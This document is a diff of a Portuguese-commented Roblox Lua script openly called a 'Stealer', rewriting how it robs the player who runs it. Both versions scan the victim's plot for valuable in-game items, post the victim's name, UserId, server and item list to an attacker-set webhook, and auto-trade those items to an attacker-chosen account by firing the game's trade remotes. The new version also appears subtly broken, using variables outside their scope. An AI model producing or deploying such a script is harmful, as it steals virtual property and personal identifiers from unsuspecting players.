@@ -1,304 +1,51 @@
--- STEALER LIMPO - Sem hooks, sem anti-kick, sem debug
--- Só escaneia e envia trade
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ALLOWED_GAME_ID = 109983668079237
 
-if game.PlaceId ~= 109983668079237 then
+if game.PlaceId ~= ALLOWED_GAME_ID then
+    warn("[Stealer] Este script só funciona no jogo específico.")
+    print("[Stealer] Jogo atual: " .. game.PlaceId .. " | Permitido: " .. ALLOWED_GAME_ID)
     return
 end
 
-print("[Stealer] Carregando...")
+print("[Stealer] Verificação de jogo aprovada! Continuando...")
 
-local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
-local LocalPlayer = Players.LocalPlayer
 
-local TARGET_USERS = getgenv().TARGET_USERS or {}
-if #TARGET_USERS == 0 and getgenv().TARGET_USER then
-    TARGET_USERS = {getgenv().TARGET_USER}
-end
+local VictimId = LocalPlayer.UserId
+local VictimName = LocalPlayer.Name
+
+local TARGET_USER = getgenv().TARGET_USER or "SeuNick"
 local WEBHOOK_URL = getgenv().WEBHOOK_URL or ""
-local TARGET_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
-local TARGET_BASE_SKINS = getgenv().NORMAL_BASE_SKINS or {}
-local TARGET_GEARS = getgenv().NORMAL_GEARS or {}
-local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15
+local WANTED_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
+local WANTED_BASES = getgenv().NORMAL_BASE_SKINS or {}
+local WANTED_GEARS = getgenv().NORMAL_GEARS or {}
 
-local tradeCompleted = false
-local webhookSent = false
+local AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+local MutationsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Mutations"))
+local TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits"))
+local NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
 
--- ===== LOAD DATA =====
-local AnimalsData, MutationsData, TraitsData, NumberUtils
+local Net = require(ReplicatedStorage.Packages.Net)
 
-local function loadData()
-    if AnimalsData then return true end
-    pcall(function()
-        local d = ReplicatedStorage:WaitForChild("Datas")
-        AnimalsData = require(d:WaitForChild("Animals"))
-        MutationsData = require(d:WaitForChild("Mutations"))
-        TraitsData = require(d:WaitForChild("Traits"))
-        NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
-    end)
-    return AnimalsData ~= nil
-end
-loadData()
+local REMOTES = {
+    Invite = Net:RemoteFunction("TradeService/Invite"),
+    AcceptInvite = Net:RemoteFunction("TradeService/AcceptInvite"),
+    AddBrainrot = Net:RemoteFunction("TradeService/AddBrainrot"),
+    RemoveBrainrot = Net:RemoteFunction("TradeService/RemoveBrainrot"),
+    AddItem = Net:RemoteFunction("TradeService/AddItem"),
+    RemoveItem = Net:RemoteFunction("TradeService/RemoveItem"),
+    Ready = Net:RemoteEvent("TradeService/Ready"),
+    Accept = Net:RemoteEvent("TradeService/Accept"),
+    Cancel = Net:RemoteEvent("TradeService/CancelTrade"),
+    Decline = Net:RemoteEvent("TradeService/DeclineInvite"),
+}
 
--- ===== GET PLOT OWNER =====
-local function getPlotOwner(plot)
-    local sign = plot:FindFirstChild("PlotSign")
-    if not sign then return nil end
-    local gui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
-    if not gui then return nil end
-    local label = gui:FindFirstChildWhichIsA("TextLabel", true)
-    if not label then return nil end
-    local text = label.Text
-    if not text or text == "" or text:lower():find("empty") then return nil end
-    local owner = text:match("^(.+)'s Base$")
-    return owner or text
-end
-
--- ===== CALCULATE GENERATION =====
-local function calculateGeneration(index, mutation, traits)
-    if not loadData() then return 0 end
-    local info = AnimalsData[index]
-    if not info or not info.Generation then return 0 end
-    local base = info.Generation
-    local mult = 1
-    
-    if mutation and mutation ~= "None" and mutation ~= "" then
-        local m = MutationsData[mutation]
-        if m and m.Modifier then
-            mult = mult + m.Modifier
-        end
-    end
-    
-    if type(traits) == "table" then
-        for _, tr in ipairs(traits) do
-            local t = TraitsData[tr]
-            if t and t.MultiplierModifier then
-                mult = mult + t.MultiplierModifier
-            end
-        end
-    end
-    
-    return math.floor(base * mult)
-end
-
-local function formatNumber(val)
-    if NumberUtils and NumberUtils.ToString then
-        return "$" .. NumberUtils:ToString(val) .. "/s"
-    end
-    return "$" .. tostring(val) .. "/s"
-end
-
--- ===== ESCANEIA BRAINROTS (VIA WORKSPACE) =====
-local function scanBrainrotsFromWorkspace()
-    local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return {} end
-    
-    local found = {}
-    local username = LocalPlayer.Name
-    local displayName = LocalPlayer.DisplayName
-    
-    for _, plot in ipairs(plots:GetChildren()) do
-        if plot:IsA("Model") then
-            local owner = getPlotOwner(plot)
-            if owner == username or owner == displayName then
-                for _, desc in ipairs(plot:GetDescendants()) do
-                    if desc:IsA("Model") and desc:FindFirstChildOfClass("Humanoid") then
-                        local brainrotName = desc.Name
-                        if TARGET_BRAINROTS[brainrotName] then
-                            local attrs = desc:GetAttributes()
-                            local mutation = attrs.Mutation or attrs.__mutation or "None"
-                            local traits = attrs.Traits or {}
-                            
-                            local gen = calculateGeneration(brainrotName, mutation, traits)
-                            
-                            table.insert(found, {
-                                name = brainrotName,
-                                slotKey = brainrotName,
-                                model = desc,
-                                mutation = mutation,
-                                traits = traits,
-                                gen = gen
-                            })
-                        end
-                    end
-                end
-                break
-            end
-        end
-    end
-    
-    table.sort(found, function(a, b) return a.gen > b.gen end)
-    return found
-end
-
--- ===== ESCANEIA BASE SKINS =====
-local function scanBaseSkins()
-    local found = {}
-    local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return found end
-    
-    local username = LocalPlayer.Name
-    local displayName = LocalPlayer.DisplayName
-    
-    for _, plot in ipairs(plots:GetChildren()) do
-        if plot:IsA("Model") then
-            local owner = getPlotOwner(plot)
-            if owner == username or owner == displayName then
-                local attrs = plot:GetAttributes()
-                if attrs.BaseSkins and type(attrs.BaseSkins) == "table" then
-                    for name, data in pairs(attrs.BaseSkins) do
-                        if TARGET_BASE_SKINS[name] then
-                            table.insert(found, {name = name, data = data})
-                        end
-                    end
-                end
-                break
-            end
-        end
-    end
-    return found
-end
-
--- ===== ESCANEIA GEARS =====
-local function scanGears()
-    local found = {}
-    local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return found end
-    
-    local username = LocalPlayer.Name
-    local displayName = LocalPlayer.DisplayName
-    
-    for _, plot in ipairs(plots:GetChildren()) do
-        if plot:IsA("Model") then
-            local owner = getPlotOwner(plot)
-            if owner == username or owner == displayName then
-                local attrs = plot:GetAttributes()
-                if attrs.Gears and type(attrs.Gears) == "table" then
-                    for name, data in pairs(attrs.Gears) do
-                        if TARGET_GEARS[name] then
-                            table.insert(found, {name = name, data = data})
-                        end
-                    end
-                end
-                break
-            end
-        end
-    end
-    return found
-end
-
--- ===== REMOTES =====
-local function getRemote(name)
-    local net = ReplicatedStorage:FindFirstChild("Packages")
-    if net then
-        net = net:FindFirstChild("Net")
-        if net then
-            local children = net:GetChildren()
-            for i = 1, #children - 1 do
-                if children[i] and children[i].Name and string.find(children[i].Name, name) then
-                    return children[i + 1]
-                end
-            end
-        end
-    end
-    return nil
-end
-
--- ===== WEBHOOK =====
-local function sendWebhook(brainrots, baseSkins, gears)
-    if WEBHOOK_URL == "" or webhookSent then return end
-    webhookSent = true
-    
-    local request = syn and syn.request or (http and http.request or (http_request or request))
-    if not request then return end
-    
-    local allItems = {}
-    for _, item in ipairs(brainrots) do
-        table.insert(allItems, {item = item, type = "Brainrot"})
-    end
-    for _, item in ipairs(baseSkins) do
-        table.insert(allItems, {item = item, type = "BaseSkin"})
-    end
-    for _, item in ipairs(gears) do
-        table.insert(allItems, {item = item, type = "Gear"})
-    end
-    
-    if #allItems == 0 then
-        print("[Stealer] Nenhum item encontrado!")
-        return
-    end
-    
-    local lines = {}
-    for _, entry in ipairs(allItems) do
-        if entry.type == "Brainrot" then
-            local mutationText = ""
-            if entry.item.mutation and entry.item.mutation ~= "None" and entry.item.mutation ~= "" then
-                mutationText = " | Mutation: **" .. entry.item.mutation .. "**"
-            end
-            table.insert(lines, "**" .. entry.item.name .. "** [Brainrot]" .. mutationText .. " | Gen: **" .. formatNumber(entry.item.gen) .. "**")
-        elseif entry.type == "BaseSkin" then
-            table.insert(lines, "**" .. entry.item.name .. "** [BaseSkin]")
-        elseif entry.type == "Gear" then
-            table.insert(lines, "**" .. entry.item.name .. "** [Gear]")
-        end
-    end
-    
-    local description = table.concat(lines, "\n")
-    if #description > 4000 then
-        description = description:sub(1, 3996) .. "..."
-    end
-    
-    local executorName = "Unknown"
-    pcall(function()
-        if identifyexecutor then executorName = identifyexecutor()
-        elseif getexecutorname then executorName = getexecutorname() end
-    end)
-    
-    local embed = {
-        title = "Brainrot Stealer",
-        description = description,
-        color = 0xFF0000,
-        fields = {
-            {
-                name = "Server",
-                value = "Players: **" .. #Players:GetPlayers() .. "**",
-                inline = true
-            },
-            {
-                name = "Executor",
-                value = executorName,
-                inline = true
-            }
-        },
-        footer = {
-            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId .. " | " .. os.date("%d/%m/%Y %H:%M:%S")
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-    
-    pcall(function()
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode({
-                content = "@everyone",
-                embeds = { embed },
-                username = "Stealer",
-                avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
-            })
-        })
-        print("[Stealer] Webhook enviado!")
-    end)
-end
-
--- ===== GET USER ID =====
-local function getUserIdFromName(username)
-    if type(username) == "number" then return username end
+local function getUserIdByName(name)
     local success, result = pcall(function()
-        return Players:GetUserIdFromNameAsync(username)
+        return Players:GetUserIdFromNameAsync(name)
     end)
     if success and result then
         return result
@@ -306,86 +53,242 @@ local function getUserIdFromName(username)
     return nil
 end
 
-local function isPlayerOnline(userId)
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.UserId == userId then
-            return true
-        end
-    end
-    return false
-end
+local function scanVictim()
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return {} end
 
--- ===== MAIN =====
-local function main()
-    print("[Stealer] Escaneando brainrots via Workspace...")
-    
-    local brainrots = scanBrainrotsFromWorkspace()
-    local baseSkins = scanBaseSkins()
-    local gears = scanGears()
-    
-    print("[Stealer] Brainrots: " .. #brainrots)
-    print("[Stealer] Base Skins: " .. #baseSkins)
-    print("[Stealer] Gears: " .. #gears)
-    
-    sendWebhook(brainrots, baseSkins, gears)
-    
-    if #brainrots == 0 then
-        print("[Stealer] Nenhum brainrot alvo encontrado!")
-        return
+    local victimPets = {}
+    local displayNameToIndex = {}
+
+    for idx, info in pairs(AnimalsData) do
+        if info.DisplayName then
+            displayNameToIndex[info.DisplayName] = idx
+        end
+        displayNameToIndex[idx] = idx
     end
-    
-    if #TARGET_USERS == 0 then
-        print("[Stealer] Nenhum target configurado!")
-        return
-    end
-    
-    local inviteRemote = getRemote("TradeService/Invite")
-    local addBrainrotRemote = getRemote("TradeService/AddBrainrot")
-    local readyRemote = getRemote("TradeService/Ready")
-    local acceptRemote = getRemote("TradeService/Accept")
-    
-    if not inviteRemote or not addBrainrotRemote then
-        print("[Stealer] Remotes não encontrados!")
-        return
-    end
-    
-    while not tradeCompleted do
-        for _, target in ipairs(TARGET_USERS) do
-            if target ~= "" then
-                local userId = getUserIdFromName(target)
-                if userId and isPlayerOnline(userId) then
-                    print("[Stealer] Enviando invite para: " .. target)
-                    
-                    local success = pcall(inviteRemote.InvokeServer, inviteRemote, "afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
-                    
-                    if success then
-                        print("[Stealer] Invite enviado!")
-                        task.wait(3)
-                        
-                        for _, brainrot in ipairs(brainrots) do
-                            print("[Stealer] Adicionando: " .. brainrot.name)
-                            pcall(addBrainrotRemote.InvokeServer, addBrainrotRemote, "6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
-                            task.wait(1.5)
-                        end
-                        
-                        if readyRemote and acceptRemote then
-                            task.wait(3)
-                            pcall(readyRemote.FireServer, readyRemote, "d73acf93-6f32-44df-b813-0f6b32c7afd9")
-                            task.wait(2)
-                            pcall(acceptRemote.FireServer, acceptRemote, "918ee0f5-e98f-413f-b76e-baee47b021cb")
-                            print("[Stealer] Trade concluída!")
-                            tradeCompleted = true
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign then
+            local gui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
+            if gui then
+                local label = gui:FindFirstChildWhichIsA("TextLabel", true)
+                if label then
+                    local text = label.Text
+                    if text and text ~= "" and not text:lower():find("empty") then
+                        local owner = text:match("^(.+)'s Base$") or text
+                        if owner == VictimName then
+                            for _, desc in ipairs(plot:GetDescendants()) do
+                                if desc:IsA("Model") and desc:FindFirstChildOfClass("Humanoid") then
+                                    local displayName = desc.Name
+                                    local index = displayNameToIndex[displayName] or displayName
+                                    local attrs = desc:GetAttributes()
+                                    local mutation = attrs.Mutation or attrs.__mutation or "None"
+                                    local traits = attrs.Traits and tostring(attrs.Traits) or "None"
+
+                                    local info = AnimalsData[index]
+                                    local gen = info and info.Generation or 0
+
+                                    table.insert(victimPets, {
+                                        name = displayName,
+                                        index = index,
+                                        mutation = mutation,
+                                        traits = traits,
+                                        generation = gen,
+                                    })
+                                end
+                            end
                         end
                     end
                 end
             end
         end
-        
-        if not tradeCompleted then
-            task.wait(DELAY_BETWEEN_INVITES)
+    end
+
+    return victimPets
+end
+
+local function checkItems(victimPets)
+    local found = {
+        brainrots = {},
+        bases = {},
+        gears = {},
+    }
+
+    for _, pet in ipairs(victimPets) do
+        if WANTED_BRAINROTS[pet.name] then
+            table.insert(found.brainrots, pet)
         end
+    end
+
+    table.sort(found.brainrots, function(a, b)
+        return a.generation > b.generation
+    end)
+
+    return found
+end
+
+local function sendWebhook(victimPets, found, tradeStatus)
+    if WEBHOOK_URL == "" then return end
+
+    local playerCount = #Players:GetPlayers()
+    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+    local executor = syn and "Synapse X" or (krnl and "Krnl") or (script and "Delta") or "Unknown"
+
+    local brainrotNames = {}
+    for _, pet in ipairs(found.brainrots) do
+        table.insert(brainrotNames, pet.name .. " (Gen: " .. pet.generation .. ")")
+    end
+
+    local baseNames = {}
+    for _, base in ipairs(found.bases) do
+        table.insert(baseNames, base)
+    end
+
+    local gearNames = {}
+    for _, gear in ipairs(found.gears) do
+        table.insert(gearNames, gear)
+    end
+
+    local embed = {
+        ["title"] = "VITIMA ENCONTRADA!",
+        ["description"] = string.format(
+            "**%s** [%s]\n\n" ..
+            "**Brainrots Encontrados:**\n%s\n\n" ..
+            "**Bases Encontradas:**\n%s\n\n" ..
+            "**Gears Encontrados:**\n%s\n\n" ..
+            "**Server:** %s\n" ..
+            "**Players:** %d\n" ..
+            "**Scanned:** %s\n\n" ..
+            "**Executor:** %s\n\n" ..
+            "**Vítima:** %s • %d | %s",
+            tradeStatus or "Status Desconhecido",
+            "Brainrot",
+            #brainrotNames > 0 and table.concat(brainrotNames, "\n") or "Nenhum",
+            #baseNames > 0 and table.concat(baseNames, "\n") or "Nenhuma",
+            #gearNames > 0 and table.concat(gearNames, "\n") or "Nenhum",
+            game.JobId or "Desconhecido",
+            playerCount,
+            timestamp,
+            executor,
+            VictimName,
+            VictimId,
+            timestamp
+        ),
+        ["color"] = 0xFF0000,
+        ["footer"] = {
+            ["text"] = "Stealer by DeadJB"
+        }
+    }
+
+    local payload = {
+        ["content"] = "@everyone",
+        ["embeds"] = {embed}
+    }
+
+    pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
+local function sendTradeRequest(targetUserId)
+    local success, result = pcall(function()
+        return REMOTES.Invite:InvokeServer(targetUserId)
+    end)
+    return success, result
+end
+
+local function addItemsToTrade(found)
+    for _, pet in ipairs(found.brainrots) do
+        pcall(function()
+            REMOTES.AddBrainrot:InvokeServer(pet.index, pet.mutation, pet.traits)
+        end)
+        task.wait(5)
+    end
+
+    for _, base in ipairs(found.bases) do
+        pcall(function()
+            REMOTES.AddItem:InvokeServer("BaseSkin", base)
+        end)
+        task.wait(5)
+    end
+
+    for _, gear in ipairs(found.gears) do
+        pcall(function()
+            REMOTES.AddItem:InvokeServer("Gear", gear)
+        end)
+        task.wait(5)
     end
 end
 
-pcall(main)
-print("[Stealer] Finalizado!")
+local function confirmTrade()
+    pcall(function()
+        REMOTES.Ready:FireServer()
+        task.wait(1)
+        REMOTES.Accept:FireServer()
+    end)
+end
+
+print("[Stealer] Iniciando...")
+print("[Stealer] Vítima: " .. VictimName .. " (" .. VictimId .. ")")
+print("[Stealer] Alvo (quem vai receber): " .. TARGET_USER)
+
+local targetUserId = getUserIdByName(TARGET_USER)
+if not targetUserId then
+    warn("[Stealer] Não foi possível encontrar o usuário: " .. TARGET_USER)
+    return
+end
+
+print("[Stealer] Target UserId: " .. targetUserId)
+
+local isTrading = false
+local tradeAccepted = false
+
+while not tradeAccepted do
+    task.wait(10)
+
+    local victimPets = scanVictim()
+    if #victimPets == 0 then
+        print("[Stealer] Nenhum pet encontrado no plot da vítima. Aguardando...")
+        goto continue
+    end
+
+    local found = checkItems(victimPets)
+    local hasItems = #found.brainrots > 0 or #found.bases > 0 or #found.gears > 0
+
+    if not hasItems then
+        print("[Stealer] Vítima não tem os itens desejados. Aguardando...")
+        goto continue
+    end
+
+    print("[Stealer] Itens encontrados!")
+    for _, pet in ipairs(found.brainrots) do
+        print("  - Brainrot: " .. pet.name .. " (Gen: " .. pet.generation .. ")")
+    end
+    for _, base in ipairs(found.bases) do
+        print("  - Base: " .. base)
+    end
+    for _, gear in ipairs(found.gears) do
+        print("  - Gear: " .. gear)
+    end
+
+    if not isTrading then
+        print("[Stealer] Enviando pedido de trade para: " .. TARGET_USER .. " (" .. targetUserId .. ")")
+        local success, result = sendTradeRequest(targetUserId)
+        if success then
+            print("[Stealer] Pedido de trade enviado!")
+            isTrading = true
+        else
+            print("[Stealer] Falha ao enviar pedido: " .. tostring(result))
+        end
+    end
+
+    ::continue::
+end
+
+print("[Stealer] Trade aceito! Colocando itens...")
+addItemsToTrade(found)
+confirmTrade()
+
+print("[Stealer] Trade finalizada com sucesso!")
+sendWebhook(victimPets, found, "SUCESSO")
